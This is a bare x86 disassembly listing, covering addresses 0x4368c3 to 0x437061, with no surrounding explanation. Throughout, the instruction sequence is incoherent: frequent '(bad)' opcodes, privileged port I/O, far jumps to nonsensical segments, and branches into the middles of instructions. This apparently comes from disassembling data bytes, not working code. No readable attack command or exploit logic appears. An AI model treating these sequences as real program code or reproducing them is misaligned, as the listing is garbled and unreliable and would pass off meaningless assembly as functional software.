  4368c3:	test   BYTE PTR [ebp+0x6],bl
  4368c6:	add    BYTE PTR [eax],al
  4368c8:	mov    ds:0x72474c16,eax
  4368cd:	sbb    edi,DWORD PTR [ebx+0x83]
  4368d3:	add    BYTE PTR [eax],al
  4368d5:	in     al,dx
  4368d6:	add    bh,BYTE PTR [ebx-0x40]
  4368d9:	pop    eax
  4368db:	jecxz  0x4368df
  4368dd:	in     eax,0xdc
  4368df:	jecxz  0x43686a
  4368e1:	sbb    DWORD PTR [ebp+0x7b],edx
  4368e4:	out    dx,al
  4368e5:	dec    esi
  4368e6:	js     0x436885
  4368e8:	add    BYTE PTR [ecx+eax*1+0x5e],cl
  4368ec:	adc    DWORD PTR [ecx],0x57
  4368ef:	or     DWORD PTR [edi],ecx
  4368f1:	retf   0x815c
  4368f4:	dec    ebp
  4368f5:	jo     0x4368cb
  4368f7:	lea    ecx,ds:0xff03302
  4368fe:	mov    eax,0xec9fff84
  436903:	sti    
  436904:	add    BYTE PTR [ebx-0x7b],al
  436907:	fld    DWORD PTR [edi]
  436909:	or     al,0x1
  43690b:	pop    es
  43690c:	mov    dh,0x1e
  43690e:	outs   dx,BYTE PTR ds:[esi]
  43690f:	inc    ebp
  436910:	cld    
  436911:	xchg   edi,eax
  436912:	pop    edi
  436913:	retf   
  436914:	loopne 0x4368ad
  436916:	(bad)  
  436918:	inc    edx
  436919:	pop    eax
  43691b:	or     BYTE PTR [ebx],al
  43691d:	mov    ah,0x1a
  43691f:	cmp    DWORD PTR [ebx],eax
  436921:	jne    0x436945
  436923:	dec    edi
  436924:	clc    
  436925:	sahf   
  436926:	mov    ebx,0xafc6d732
  43692b:	jns    0x4368ea
  43692d:	test   dl,0xfd
  436930:	jl     0x4368e7
  436932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436933:	jl     0x436978
  436935:	leave  
  436936:	imul   ebx,DWORD PTR [ecx+0xfd],0x66020000
  436940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436941:	stc    
  436942:	mov    dl,0x6f
  436944:	inc    ecx
  436945:	mov    esi,DWORD PTR [esp+ebp*4]
  436948:	jmp    0x997b:0x82c426ef
  43694f:	stos   BYTE PTR es:[edi],al
  436950:	test   BYTE PTR [ebx-0x25c0f],0x7a
  436957:	fld    QWORD PTR [ecx]
  436959:	stc    
  43695a:	xor    BYTE PTR [edi],ch
  43695c:	jns    0x436928
  43695e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43695f:	dec    edx
  436960:	jns    0x4369ad
  436962:	push   ecx
  436963:	push   0xa87dc282
  436968:	lds    ecx,FWORD PTR [ebx+0x537ca4b4]
  43696e:	pop    ebp
  43696f:	add    DWORD PTR [esi+ebp*2-0x7a6706d4],esi
  436976:	sub    DWORD PTR ss:[ecx+edi*2-0x7907160a],esp
  43697e:	mov    al,0xfd
  436980:	ret    0x7ae5
  436983:	and    DWORD PTR [ebx-0x270ad507],ebp
  436989:	mov    esi,0x4378f976
  43698e:	and    ebp,ebp
  436990:	ds in  al,0x75
  436993:	test   eax,0x64fefffd
  436998:	adc    eax,0x3d213afd
  43699d:	fs jbe 0x4369a2
  4369a0:	sub    ah,BYTE PTR [eax+eax*1]
  4369a3:	add    BYTE PTR [eax],al
  4369a5:	add    BYTE PTR [eax],al
  4369a7:	test   al,0xca
  4369a9:	jmp    0x6003:0xe700bf82
  4369b0:	sbb    eax,0xfe6103d3
  4369b5:	ins    DWORD PTR es:[edi],dx
  4369b6:	inc    eax
  4369b7:	fldenv [edi+0x23278e6]
  4369bd:	pop    esi
  4369be:	cmp    cl,BYTE PTR [ebp-0x65]
  4369c1:	sbb    al,0xb0
  4369c3:	push   edi
  4369c4:	mov    DWORD PTR [ebx],ebp
  4369c6:	cmp    esp,DWORD PTR ds:0x281c229b
  4369cc:	sbb    eax,0xae26039b
  4369d1:	pop    esi
  4369d2:	inc    edx
  4369d3:	adc    edi,edi
  4369d5:	sub    DWORD PTR [edx+ecx*2],esp
  4369d8:	inc    ebx
  4369d9:	psubq  mm1,QWORD PTR [eax]
  4369dc:	std    
  4369dd:	jo     0x436989
  4369df:	jl     0x436a60
  4369e1:	stos   BYTE PTR es:[edi],al
  4369e2:	or     BYTE PTR [esi+eax*4-0x68],ch
  4369e6:	add    DWORD PTR [ebp+0x2],esi
  4369e9:	rol    DWORD PTR [esi+0x3e5122c],0x75
  4369f0:	add    bl,dl
  4369f2:	jg     0x4369dc
  4369f4:	add    esp,edi
  4369f6:	add    edi,esi
  4369f8:	xor    bh,0x0
  4369fb:	jne    0x4369ff
  4369fd:	fs cmp dl,cl
  436a00:	mov    eax,ebp
  436a02:	jl     0x4369b8
  436a04:	dec    esi
  436a05:	je     0x436999
  436a07:	and    eax,0x3e700
  436a0c:	add    BYTE PTR [eax],al
  436a0e:	add    BYTE PTR [eax],al
  436a10:	mov    ebx,0xee23ba87
  436a15:	inc    edx
  436a16:	mov    bl,0x53
  436a18:	stos   BYTE PTR es:[edi],al
  436a19:	ret    
  436a1a:	out    0xfc,eax
  436a1c:	adc    bl,BYTE PTR [ebx+0x42fe55e7]
  436a22:	add    BYTE PTR [ecx-0x5a],bh
  436a25:	and    al,0xff
  436a27:	add    BYTE PTR [edi-0x2e],dh
  436a2a:	(bad)  
  436a2b:	call   0x705c3029
  436a30:	stos   BYTE PTR es:[edi],al
  436a31:	mov    edx,0x7fdca983
  436a36:	mov    ebx,0x85990cd4
  436a3b:	push   ds
  436a3c:	ins    DWORD PTR es:[edi],dx
  436a3d:	xchg   DWORD PTR [ecx+0x4d],ecx
  436a40:	dec    esi
  436a41:	xor    DWORD PTR [eax+0x64],edx
  436a44:	in     al,0x91
  436a46:	(bad)  
  436a47:	call   0x2eceb6c2
  436a4c:	inc    ecx
  436a4d:	xor    cl,BYTE PTR [edi+0x72]
  436a50:	ins    BYTE PTR es:[edi],dx
  436a51:	and    al,cl
  436a53:	jmp    0xe9436ccc
  436a58:	sbb    DWORD PTR [ecx+0x64],eax
  436a5b:	sbb    DWORD PTR [edx],ecx
  436a5d:	ss dec ecx
  436a5f:	stc    
  436a60:	and    BYTE PTR [esi+edi*8],ah
  436a63:	add    al,0xe8
  436a66:	(bad)  
  436a67:	call   0x705c305d
  436a6c:	mov    dl,0xba
  436a6e:	sub    DWORD PTR [ecx],0x6c
  436a71:	test   DWORD PTR [esp+ebx*2],ebx
  436a74:	add    BYTE PTR [eax],al
  436a76:	add    BYTE PTR [eax],al
  436a78:	add    BYTE PTR [esp+ebx*4],cl
  436a7b:	jge    0x436a49
  436a7d:	bound  eax,QWORD PTR [eax*4+0x1c41e9c]
  436a84:	fidiv  DWORD PTR [esi+0x2]
  436a87:	add    dh,ah
  436a89:	ret    0x215
  436a8c:	jmp    0xfd452e07
  436a91:	jbe    0x436a95
  436a93:	add    BYTE PTR [edx+0x52],ch
  436a96:	xchg   esi,eax
  436a97:	add    bl,BYTE PTR [ebx+0x197b197c]
  436a9d:	jae    0x436a38
  436a9f:	stc    
  436aa0:	add    BYTE PTR [eax+edx*8],bl
  436aa3:	pop    esp
  436aa4:	mov    edx,ecx
  436aa6:	popf   
  436aa7:	test   BYTE PTR [ebp+0x74],cl
  436aaa:	pop    ss
  436aab:	dec    ebp
  436aac:	lock xchg ebp,eax
  436aae:	(bad)  
  436aaf:	or     ecx,DWORD PTR [ebx+0x88166a9]
  436ab5:	addr16 rcr bh,1
  436ab8:	mov    DWORD PTR [esi+ebp*8+0x34a85582],ebx
  436abf:	adc    DWORD PTR [eax-0x20],0x745f8135
  436ac6:	sbb    eax,0x5ab43c6f
  436acb:	sub    BYTE PTR [eax],al
  436acd:	int3   
  436ace:	push   ss
  436acf:	cmp    eax,0xc352708
  436ad4:	mov    esp,DWORD PTR [esi+ebp*8-0x7e]
  436ad8:	pop    edi
  436ad9:	les    edx,FWORD PTR [esi]
  436adb:	outs   dx,DWORD PTR ds:[esi]
  436adc:	cmp    al,0x0
  436ade:	add    BYTE PTR [eax],al
  436ae0:	add    BYTE PTR [eax],al
  436ae2:	adc    eax,0xac8be848
  436ae7:	push   ss
  436ae8:	inc    eax
  436ae9:	add    al,0x1f
  436aeb:	pop    ecx
  436aec:	or     BYTE PTR [ebx+0x4d8296cb],al
  436af2:	cld    
  436af3:	sbb    ecx,DWORD PTR [ebp-0x8]
  436af6:	in     eax,0xd8
  436af8:	sti    
  436af9:	psrlw  mm6,QWORD PTR [ecx]
  436afc:	std    
  436afd:	dec    DWORD PTR [edx+eax*8+0x7f]
  436b01:	les    esp,FWORD PTR [edi+0x5]
  436b04:	add    bh,bh
  436b06:	mov    ebx,0xa9e9f76a
  436b0b:	cwde   
  436b0c:	stc    
  436b0d:	call   edi
  436b0f:	ficom  DWORD PTR [ebx-0x48]
  436b12:	dec    ebp
  436b13:	add    eax,0x656f0000
  436b18:	mov    edi,0x65087
  436b1d:	add    BYTE PTR [ebp-0x55],dh
  436b20:	std    
  436b21:	push   DWORD PTR [ebp+0x63]
  436b24:	in     al,0xbc
  436b26:	(bad)  
  436b27:	sar    BYTE PTR [ebx+0x41],cl
  436b2a:	mov    ecx,0xee87f914
  436b2f:	loop   0x436aee
  436b31:	out    0x6d,eax
  436b33:	mov    eax,0xe5fcc76f
  436b38:	scas   eax,DWORD PTR es:[edi]
  436b39:	xor    eax,0x854330bb
  436b3e:	loop   0x436b6b
  436b40:	daa    
  436b41:	cld    
  436b42:	jne    0x436afc
  436b44:	jns    0x436b05
  436b46:	add    BYTE PTR [eax],al
  436b48:	add    BYTE PTR [eax],al
  436b4a:	add    BYTE PTR [eax-0x55],bh
  436b4d:	std    
  436b4e:	or     BYTE PTR [ebx],al
  436b50:	lods   eax,DWORD PTR ds:[esi]
  436b51:	mov    ds:0xb223c14b,al
  436b56:	int    0xd5
  436b58:	and    esi,DWORD PTR [ecx]
  436b5a:	push   esp
  436b5b:	aaa    
  436b5c:	sub    al,0xba
  436b5e:	or     BYTE PTR [esi-0x3d],dh
  436b61:	ins    BYTE PTR es:[edi],dx
  436b62:	jmp    DWORD PTR [edx-0x6a330256]
  436b68:	and    esi,DWORD PTR [ecx]
  436b6a:	dec    esp
  436b6b:	cld    
  436b6c:	cmc    
  436b6d:	stos   DWORD PTR es:[edi],eax
  436b6e:	dec    eax
  436b6f:	push   esi
  436b70:	ins    BYTE PTR es:[edi],dx
  436b71:	jne    0x436b77
  436b73:	hlt    
  436b74:	and    edi,DWORD PTR [edi+edi*4-0x4e0d5d74]
  436b7b:	cmp    al,0x13
  436b7d:	aas    
  436b7e:	hlt    
  436b7f:	scas   al,BYTE PTR es:[edi]
  436b80:	out    0x28,eax
  436b82:	mov    edi,0x83f0e9f9
  436b87:	xor    eax,0x1dfffdaa
  436b8c:	(bad)  
  436b8e:	or     BYTE PTR ds:0xeefffdaa,0xe1
  436b95:	ret    0x6de7
  436b98:	and    dh,BYTE PTR [edi]
  436b9a:	aam    0x82
  436b9c:	add    bl,BYTE PTR [ecx-0x43]
  436b9f:	repnz inc ebp
  436ba1:	add    esi,edi
  436ba3:	in     al,0xca
  436ba5:	out    0x38,al
  436ba7:	adc    DWORD PTR [edx+0x1cdc7a4],ecx
  436bad:	out    0x3,eax
  436baf:	add    BYTE PTR [eax],al
  436bb1:	add    BYTE PTR [eax],al
  436bb3:	add    BYTE PTR [ebp-0x4d],dh
  436bb6:	pop    es
  436bb7:	jnp    0x436b67
  436bb9:	sahf   
  436bba:	lahf   
  436bbb:	loop   0x436b76
  436bbd:	mov    bl,0xff
  436bbf:	jp     0x436bff
  436bc1:	mov    gs,WORD PTR [eax-0x57fc7a64]
  436bc7:	jp     0x436b76
  436bc9:	mov    ebp,DWORD PTR [edx]
  436bcb:	cmp    al,dh
  436bcd:	(bad)  
  436bce:	pop    esi
  436bcf:	test   BYTE PTR [esi+eax*2],0x9b
  436bd3:	jl     0x436c0b
  436bd5:	mov    gs,WORD PTR [eax+0x79076d9b]
  436bdb:	ret    
  436bdc:	mov    eax,0x27bdeec2
  436be1:	cmp    BYTE PTR [esi-0x18840003],cl
  436be7:	add    esi,DWORD PTR [ebp+0x2]
  436bea:	data16 sub BYTE PTR [ecx+0x727fda02],bl
  436bf1:	std    
  436bf2:	out    0x3,al
  436bf4:	jl     0x436c46
  436bf6:	in     eax,0x7a
  436bf8:	scas   eax,DWORD PTR es:[edi]
  436bf9:	mov    bl,0x87
  436bfb:	jp     0x436c2b
  436bfd:	mov    dh,0x6a
  436bff:	cmp    BYTE PTR [ecx+0x44],dh
  436c02:	out    0xcb,al
  436c04:	jl     0x436c56
  436c06:	and    al,0x7c
  436c08:	mov    dh,0x9e
  436c0a:	loop   0x436c79
  436c0c:	xor    al,BYTE PTR [ebx]
  436c0e:	pop    ds
  436c0f:	imul   edx,DWORD PTR [edx-0x69],0xffffffe7
  436c13:	add    edi,DWORD PTR [eax]
  436c15:	mov    ds:0x386e,al
  436c1a:	add    BYTE PTR [eax],al
  436c1c:	add    BYTE PTR [ecx-0x7d],bl
  436c1f:	add    BYTE PTR [edi],ch
  436c21:	adc    BYTE PTR ds:[ebx+0x31],0x6e
  436c26:	cmc    
  436c27:	mov    esp,0xb1090e3a
  436c2c:	lods   al,BYTE PTR ds:[esi]
  436c2d:	cmp    BYTE PTR [ebp+0x466362c0],dl
  436c33:	test   ebp,esp
  436c35:	stc    
  436c36:	jle    0x436c7b
  436c38:	std    
  436c39:	ss stos BYTE PTR es:[edi],al
  436c3b:	or     dh,ch
  436c3d:	nop
  436c3e:	ret    0xabfd
  436c41:	fcmove st,st(4)
  436c43:	shl    DWORD PTR [esi+0x4c],0x9
  436c47:	mov    dl,0x34
  436c49:	mov    dl,0x7c
  436c4b:	inc    ebx
  436c4c:	aad    0xc4
  436c4e:	pushf  
  436c4f:	and    eax,0xc4895ed8
  436c54:	bnd jbe 0x436c59
  436c57:	test   DWORD PTR [ecx-0x11f7614a],esi
  436c5d:	push   eax
  436c5e:	mov    edi,0xecb565ff
  436c63:	(bad)  
  436c64:	call   0x9869092e
  436c69:	cs dec ebx
  436c6b:	in     al,0x72
  436c6d:	loope  0x436cc5
  436c6f:	out    0xf9,eax
  436c71:	pop    ds
  436c72:	dec    ecx
  436c73:	inc    eax
  436c74:	gs mov ecx,0x88ae0512
  436c7a:	out    dx,eax
  436c7b:	(bad)  
  436c7c:	call   0xed7a0bf7
  436c81:	add    BYTE PTR [eax],al
  436c83:	add    BYTE PTR [eax],al
  436c85:	add    BYTE PTR [esi+0x2],dh
  436c88:	test   al,0xc9
  436c8a:	mov    ds:0x356ec0f1,al
  436c8f:	lock (bad) 
  436c91:	call   0x573d08af
  436c96:	sbb    BYTE PTR [eax*1-0x18fd8917],al
  436c9d:	add    BYTE PTR [ebp+0x2],bh
  436ca0:	add    BYTE PTR [eax],al
  436ca2:	in     al,0x3e
  436ca4:	je     0x436cb5
  436ca6:	xlat   BYTE PTR ds:[ebx]
  436ca7:	aad    0x7
  436ca9:	(bad)  
  436caa:	fmul   QWORD PTR [ecx]
  436cac:	daa    
  436cad:	jbe    0x436c8b
  436caf:	add    ecx,esp
  436cb1:	or     BYTE PTR [eax],bl
  436cb3:	add    al,BYTE PTR [eax]
  436cb5:	(bad)  
  436cb7:	push   esi
  436cb8:	jnp    0x436c9b
  436cba:	xor    ebx,DWORD PTR [ecx]
  436cbc:	inc    edi
  436cbd:	dec    eax
  436cbe:	pop    ebx
  436cbf:	xchg   edi,eax
  436cc0:	push   cs
  436cc1:	add    BYTE PTR [edx+eax*1],cl
  436cc4:	add    DWORD PTR [edi-0x2c],0x14
  436cc8:	shl    BYTE PTR [ebx+ebx*1-0x55],0xe9
  436ccd:	jae    0x436c54
  436ccf:	or     eax,0x1cc24a4
  436cd4:	add    BYTE PTR [eax],al
  436cd6:	dec    edi
  436cd7:	fdiv   st(3),st
  436cd9:	add    BYTE PTR [ebx-0x23fbc6eb],dh
  436cdf:	add    DWORD PTR [edi],eax
  436ce1:	mov    dh,0xce
  436ce3:	pop    esi
  436ce4:	inc    ebp
  436ce5:	cld    
  436ce6:	push   edi
  436ce7:	dec    edi
  436ce8:	retf   
  436ce9:	loopne 0x436ceb
  436ceb:	add    BYTE PTR [eax],al
  436ced:	add    BYTE PTR [eax],al
  436cef:	pop    esi
  436cf0:	cmp    DWORD PTR [esi-0x7bbdaf8],0x3
  436cf7:	mov    ah,0xaa
  436cf9:	jo     0x436d43
  436cfb:	jle    0x436cb9
  436cfd:	or     DWORD PTR [edi+0x54],0x26
  436d01:	stc    
  436d02:	call   FWORD PTR [ecx+eax*1+0x50a7e0cb]
  436d09:	dec    eax
  436d0a:	and    ecx,edi
  436d0c:	add    BYTE PTR [edi],bh
  436d0e:	inc    eax
  436d0f:	(bad)  
  436d11:	stc    
  436d12:	mov    ds,WORD PTR [eax-0x18fffff6]
  436d18:	into   
  436d19:	aas    
  436d1a:	mov    DWORD PTR [ebp+0x1c],esi
  436d1d:	mov    ch,0x15
  436d1f:	jne    0x436ccc
  436d21:	mov    esp,0xfdab6301
  436d26:	(bad)  
  436d27:	out    dx,al
  436d28:	arpl   WORD PTR [ebp-0x48],ax
  436d2b:	je     0x436cd8
  436d2d:	std    
  436d2e:	inc    DWORD PTR [esi+0x4b]
  436d31:	xor    eax,0xb510361d
  436d36:	test   DWORD PTR [edx-0x12fb87a5],edi
  436d3c:	pop    ds
  436d3d:	mov    ch,0xbf
  436d3f:	sbb    al,0xa3
  436d41:	hlt    
  436d42:	mov    cl,0x3c
  436d44:	adc    bh,BYTE PTR [edx]
  436d46:	hlt    
  436d47:	ds in  eax,0x2a
  436d4a:	inc    eax
  436d4b:	in     eax,0x27
  436d4d:	and    bh,ah
  436d4f:	jne    0x436d05
  436d51:	jns    0x436d22
  436d53:	add    BYTE PTR [eax],al
  436d55:	add    BYTE PTR [eax],al
  436d57:	add    BYTE PTR [esi-0x55],dh
  436d5a:	std    
  436d5b:	or     BYTE PTR [ebx],ch
  436d5d:	test   eax,0x1fd94b9e
  436d62:	into   
  436d63:	int    0xd5
  436d65:	pop    ds
  436d66:	dec    ebp
  436d67:	pop    eax
  436d68:	aaa    
  436d69:	sub    dh,al
  436d6b:	or     BYTE PTR [esi+0x63],dh
  436d6e:	pop    esp
  436d6f:	(bad)  
  436d70:	mov    edx,0x95ccfdaa
  436d75:	pop    ds
  436d76:	dec    ebp
  436d77:	push   eax
  436d78:	cld    
  436d79:	aad    0x9b
  436d7b:	dec    eax
  436d7c:	push   esi
  436d7d:	push   0x1ff40489
  436d82:	int3   
  436d83:	mov    edi,0xb20ea29c
  436d88:	mov    esp,0x3ef44711
  436d8d:	gs adc eax,0xd1acdbf
  436d93:	and    DWORD PTR ds:0xfefffdaa,0x2
  436d9a:	das    
  436d9b:	lds    ebx,FWORD PTR [edx+0xb]
  436d9e:	jo     0x436df1
  436da0:	inc    ecx
  436da1:	add    al,0x99
  436da3:	int    0xfa
  436da5:	inc    ebp
  436da6:	inc    ebx
  436da7:	adc    eax,DWORD PTR [edi]
  436da9:	retf   
  436daa:	out    0x50,al
  436dac:	pop    ecx
  436dad:	mov    ah,BYTE PTR [edi+edi*4+0x3e701fd]
  436db4:	jne    0x436d65
  436db6:	inc    edi
  436db7:	(bad)  
  436db8:	mov    esi,0xe6af9e
  436dbd:	add    BYTE PTR [eax],al
  436dbf:	add    BYTE PTR [eax],al
  436dc1:	loope  0x436d72
  436dc3:	jg     0xad6bfc77
  436dc9:	jmp    DWORD PTR gs:[edi]
  436dcc:	(bad)  
  436dcd:	cmp    eax,0xf833aa88
  436dd2:	(bad)  
  436dd3:	outs   dx,BYTE PTR ds:[esi]
  436dd4:	adc    eax,edi
  436dd6:	inc    ebp
  436dd7:	sbb    ecx,DWORD PTR [ebp-0x53d771ca]
  436ddd:	jge    0x436de2
  436ddf:	cdq    
  436de0:	ret    
  436de1:	loopne 0x436da5
  436de3:	push   ds
  436de4:	retf   0x2c67
  436de7:	data16 and cl,dl
  436dea:	add    bl,dl
  436dec:	xchg   DWORD PTR [edx+0x6c03e6ff],ecx
  436df2:	dec    esp
  436df3:	in     eax,0x8e
  436df5:	scas   eax,DWORD PTR es:[edi]
  436df6:	scas   eax,DWORD PTR es:[edi]
  436df7:	(bad)  
  436df8:	mov    ?,WORD PTR [esi]
  436dfa:	mov    dh,0xaa
  436dfc:	push   eax
  436dfd:	test   eax,0x6cbbe640
  436e02:	dec    esp
  436e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436e04:	mov    WORD PTR [esi],?
  436e06:	sahf   
  436e07:	loop   0x436e62
  436e09:	mov    edx,0x8a5b9eff
  436e0e:	xchg   ebx,eax
  436e0f:	out    0x3,eax
  436e11:	mov    al,0xa2
  436e13:	outs   dx,BYTE PTR ds:[esi]
  436e14:	push   eax
  436e15:	xchg   ecx,eax
  436e16:	jg     0x436e18
  436e18:	scas   eax,DWORD PTR es:[edi]
  436e19:	jle    0x436e96
  436e1b:	push   ebx
  436e1c:	jno    0x436ddc
  436e1e:	cmc    
  436e1f:	mov    esp,0xb1090e3a
  436e24:	lods   al,BYTE PTR ds:[esi]
  436e25:	add    BYTE PTR [eax],al
  436e27:	add    BYTE PTR [eax],al
  436e29:	add    BYTE PTR [edx*4+0x32a762c0],dh
  436e30:	test   ebp,esp
  436e32:	icebp  
  436e33:	jp     0x436e78
  436e35:	cmp    eax,0xee08aa39
  436e3a:	pushf  
  436e3b:	ret    0xabfd
  436e3e:	fcmove st,st(4)
  436e40:	shl    DWORD PTR [esi-0x4b4df668],0x35
  436e47:	jge    0x436e8c
  436e49:	adc    eax,0x18259ce3
  436e4e:	jns    0x436dd9
  436e50:	(bad)  
  436e51:	bnd jbe 0x436e56
  436e54:	test   DWORD PTR [ecx],esi
  436e56:	cmp    DWORD PTR [ebx-0x446311f8],ebx
  436e5c:	jmp    DWORD PTR [ebp-0x46]
  436e5f:	in     al,dx
  436e60:	(bad)  
  436e61:	call   0xd8690b89
  436e66:	out    dx,al
  436e67:	inc    esi
  436e68:	in     al,0x91
  436e6a:	xor    DWORD PTR [esi],ecx
  436e6c:	or     DWORD PTR [edx+0x3a],esp
  436e6f:	or     al,cl
  436e71:	sub    ecx,ecx
  436e73:	jmp    0x9bbc97e9
  436e78:	pop    eax
  436e79:	jmp    0x436ef1
  436e7b:	add    al,BYTE PTR [ebp-0x3faf7b5f]
  436e81:	test   al,0xde
  436e83:	icebp  
  436e84:	jl     0x436e0f
  436e86:	test   BYTE PTR [ebx+0x49],bh
  436e89:	and    eax,0xae4840ee
  436e8e:	add    BYTE PTR [eax],al
  436e90:	add    BYTE PTR [eax],al
  436e92:	add    BYTE PTR [ecx+esi*8-0x1],bh
  436e96:	call   0x84ec11
  436e9b:	inc    esp
  436e9c:	jnp    0x436e5e
  436e9e:	je     0x436eec
  436ea0:	mov    ch,0xe9
  436ea2:	jae    0x436ee2
  436ea4:	xchg   DWORD PTR [ebp-0x4],esi
  436ea7:	pop    esp
  436ea8:	repz adc DWORD PTR [eax+0xf00064e],0x2
  436eb0:	or     edi,esi
  436eb2:	dec    ebp
  436eb3:	test   al,0x7f
  436eb5:	(bad)  
  436eb6:	sar    DWORD PTR [eax+ecx*2+0x7d44c67b],cl
  436ebd:	dec    ebp
  436ebe:	clc    
  436ebf:	dec    edi
  436ec0:	dec    esi
  436ec1:	xor    esi,DWORD PTR [edi-0x2c]
  436ec4:	not    ebp
  436ec6:	mov    ecx,DWORD PTR [ebx]
  436ec8:	ds mov eax,0x60c01
  436ece:	shr    DWORD PTR [edi+ebx*4-0x16],cl
  436ed2:	dec    eax
  436ed3:	aas    
  436ed4:	(bad)  
  436ed5:	stc    
  436ed6:	inc    esi
  436ed7:	rcl    BYTE PTR [esi-0x1d],1
  436eda:	add    DWORD PTR [ebx+0xc0013ba],ecx
  436ee0:	mov    ebx,0x5dc17ff
  436ee5:	add    BYTE PTR [ebx+0xf007559],al
  436eeb:	push   eax
  436eec:	xor    edi,edx
  436eee:	dec    esp
  436ef0:	jle    0x436f37
  436ef2:	loopne 0x436f6b
  436ef4:	inc    ecx
  436ef5:	lock mov eax,DWORD PTR [eax]
  436ef8:	add    BYTE PTR [eax],al
  436efa:	add    BYTE PTR [eax],al
  436efc:	xchg   ebx,eax
  436efd:	cmp    dh,BYTE PTR [ebx]
  436eff:	rol    DWORD PTR [edx+0x45c1233d],0x48
  436f06:	hlt    
  436f07:	cmp    esp,DWORD PTR [ebx-0x6e]
  436f0a:	outs   dx,DWORD PTR ds:[esi]
  436f0b:	or     eax,0x1bc0221f
  436f10:	mov    WORD PTR ds:0x31110f00,es
  436f16:	stc    
  436f17:	push   DWORD PTR [ebp-0x65]
  436f1a:	mov    WORD PTR [ecx+0x45],cs
  436f1d:	mov    ah,0xbe
  436f1f:	jb     0x436f93
  436f21:	mov    ah,0xbe
  436f23:	test   DWORD PTR [edx],ebp
  436f25:	push   edi
  436f26:	add    al,0x49
  436f28:	popf   
  436f29:	and    al,BYTE PTR [edx-0xc]
  436f2c:	sahf   
  436f2d:	arpl   WORD PTR [ebp+eax*1+0x24d157ee],bp
  436f34:	sub    eax,0xfe30509c
  436f39:	pop    ebp
  436f3a:	xchg   ecx,eax
  436f3b:	xchg   DWORD PTR [eax-0x4ab67429],edi
  436f41:	adc    cl,BYTE PTR [edx-0x24]
  436f44:	jle    0x436f20
  436f46:	push   ss
  436f47:	adc    edi,esi
  436f49:	fldcw  WORD PTR [ebx-0x5a9201f6]
  436f4f:	and    eax,0x4048142d
  436f54:	in     al,dx
  436f55:	pop    ebp
  436f56:	mov    cl,0x87
  436f58:	mov    eax,0x14385d7
  436f5d:	and    al,0x4a
  436f5f:	lock add BYTE PTR [eax],al
  436f62:	add    BYTE PTR [eax],al
  436f64:	add    BYTE PTR [esi],bh
  436f66:	ficom  DWORD PTR [esi]
  436f68:	add    ebp,esi
  436f6a:	fld    DWORD PTR [ebp-0x3a3c16bd]
  436f70:	xchg   DWORD PTR [eax],edi
  436f72:	mov    eax,DWORD PTR [ebp-0x340c3eb5]
  436f78:	test   DWORD PTR [eax],esi
  436f7a:	mov    bl,0x8b
  436f7c:	dec    ecx
  436f7d:	xor    eax,0x9ed44f24
  436f82:	out    dx,al
  436f83:	stos   DWORD PTR es:[edi],eax
  436f84:	xchg   DWORD PTR [eax],esi
  436f86:	outs   dx,DWORD PTR ds:[esi]
  436f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436f88:	or     dh,cl
  436f8a:	fwait
  436f8b:	nop
  436f8c:	inc    edi
  436f8d:	jne    0x436fb3
  436f8f:	dec    edi
  436f90:	aam    0xff
  436f92:	scas   al,BYTE PTR es:[edi]
  436f93:	add    al,0x85
  436f95:	cmp    BYTE PTR [edx],al
  436f97:	(bad)  
  436f98:	mov    WORD PTR [ebp+0x42],gs
  436f9b:	call   0x6ac:0x2c7a8951
  436fa2:	sahf   
  436fa3:	popw   ds
  436fa5:	xor    eax,0x3c88f202
  436faa:	add    esp,edi
  436fac:	add    esi,DWORD PTR [eax+ecx*1]
  436faf:	fild   DWORD PTR [ebx]
  436fb1:	jne    0x436fb5
  436fb3:	sbb    al,0x63
  436fb6:	nop
  436fb7:	out    0x82,eax
  436fb9:	ficom  WORD PTR [edx+0x7af90ee7]
  436fbf:	call   0xa4bee4c7
  436fc4:	stos   DWORD PTR es:[edi],eax
  436fc5:	sti    
  436fc6:	aas    
  436fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436fc8:	mov    eax,DWORD PTR [eax]
  436fca:	add    BYTE PTR [eax],al
  436fcc:	add    BYTE PTR [eax],al
  436fce:	ins    DWORD PTR es:[edi],dx
  436fcf:	inc    edx
  436fd0:	cmp    dl,BYTE PTR [ecx+0x25]
  436fd3:	jp     0x436f81
  436fd5:	stos   DWORD PTR es:[edi],eax
  436fd6:	xor    al,0x8
  436fd8:	rol    DWORD PTR [ebx],cl
  436fda:	jne    0x436fde
  436fdc:	adc    ah,dh
  436fde:	sbb    edx,DWORD PTR [eax-0x5737d19]
  436fe4:	out    0xe,al
  436fe6:	icebp  
  436fe7:	push   edx
  436fe8:	out    0x3,eax
  436fea:	jne    0x436f6f
  436fec:	add    esp,esp
  436fee:	mov    eax,ebp
  436ff0:	imul   ebp,DWORD PTR [eax],0xffffff99
  436ff3:	add    ah,BYTE PTR [esi+0x21]
  436ff6:	jmp    0x32cb49fd
  436ffb:	add    edi,esp
  436ffd:	add    ebp,DWORD PTR [eax+ebx*2-0x1b]
  437001:	sahf   
  437002:	mov    ds,WORD PTR ds:[esi-0x33]
  437006:	mov    eax,0xb78325a2
  43700b:	cli    
  43700c:	outs   dx,DWORD PTR ds:[esi]
  43700d:	cmp    BYTE PTR [ebp-0x507d60fd],bh
  437013:	loop   0x437014
  437015:	cmp    ch,bl
  437017:	test   DWORD PTR [ebx-0x37],eax
  43701a:	pop    DWORD PTR [eax+esi*8+0x72]
  43701e:	inc    ebp
  43701f:	cli    
  437020:	(bad)  
  437021:	daa    
  437022:	lea    edx,[eax+0x43f9f542]
  437028:	loopne 0x43708e
  43702a:	mov    dh,0x16
  43702c:	daa    
  43702d:	jb     0x437054
  43702f:	call   0x0:0x1685
  437036:	add    BYTE PTR [ecx+0x3f],dh
  437039:	and    eax,0x1008f7a1
  43703e:	jmp    0xeeb7b0ec
  437043:	push   cs
  437044:	rol    BYTE PTR [edx],0xe9
  437047:	jbe    0x436fee
  437049:	add    eax,DWORD PTR [ecx-0x51]
  43704c:	in     al,dx
  43704d:	(bad)  
  43704e:	call   0x724bab42
  437053:	jge    0x436fdf
  437055:	xchg   DWORD PTR [esi-0x6c077d2],esp
  43705b:	test   DWORD PTR [eax],0x42efe910
  437061:	lock jo 0x437011
